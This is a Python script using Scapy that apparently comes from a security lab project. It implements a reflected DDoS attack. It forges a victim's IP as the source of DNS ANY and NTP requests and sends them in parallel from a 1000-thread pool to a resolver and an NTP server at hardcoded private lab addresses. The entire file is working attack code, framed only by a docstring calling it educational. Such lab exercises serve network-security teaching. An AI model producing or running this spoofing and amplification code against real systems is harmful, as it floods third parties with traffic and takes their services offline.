"""
Reflected DDoS Attack Script

This script sends spoofed DNS and NTP requests to simulate a reflected 
Distributed Denial-of-Service (DDoS) attack. Meant to be used through main.py.

Do not run this file directly unless for educational or controlled lab environments.
"""

from scapy.all import *
import concurrent.futures
import sys
import time
import random


def send_spoofed_dns(target_ip, dns_resolver):
    """
    Craft and send multiple spoofed DNS ANY requests to the DNS resolver.
    The source IP is forged as the victim's address.
    """
    domains = [
        "example.com", "www.example.com", "example.org", "example.be",
        "example.fr", "test.com", "a-very-long-domain-name.com",
        "a-very-long-domain-name.org",
        "oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof",
        "i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof",
        "domain.oof"
    ]

    for domain in domains:
        ip_layer = IP(src=target_ip, dst=dns_resolver)
        udp_layer = UDP(dport=5353)
        dns_layer = DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))  # Requesting ANY record

        packet = ip_layer / udp_layer / dns_layer
        send(packet, verbose=False)


def send_spoofed_ntp(target_ip, ntp_server):
    """
    Send a spoofed NTP request to the specified NTP server.
    The source IP is forged as the target victim.
    """
    packet = IP(dst=ntp_server, src=target_ip) / \
             UDP(sport=random.randint(1024, 65535), dport=123) / \
             NTP(version=4)
    send(packet, verbose=False)


def main():
    victim_ip = "10.12.0.10"
    dns_resolver_ip = "10.12.0.20"
    ntp_server_ip = "10.12.0.30"

    start_time = time.time()

    # Use a thread pool to simulate high-volume parallel attack
    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as pool:
        tasks = []

        for i in range(1000):  # Alternate between DNS and NTP reflection
            if i % 2 == 0:
                tasks.append(pool.submit(send_spoofed_dns, victim_ip, dns_resolver_ip))
            else:
                tasks.append(pool.submit(send_spoofed_ntp, victim_ip, ntp_server_ip))

        # Wait for all tasks to complete
        for task in concurrent.futures.as_completed(tasks):
            if task.result():
                pool.shutdown(wait=False)
                print("Execution time:", time.time() - start_time)
                sys.exit(0)

    print("Execution completed in:", time.time() - start_time)


if __name__ == "__main__":
    main()
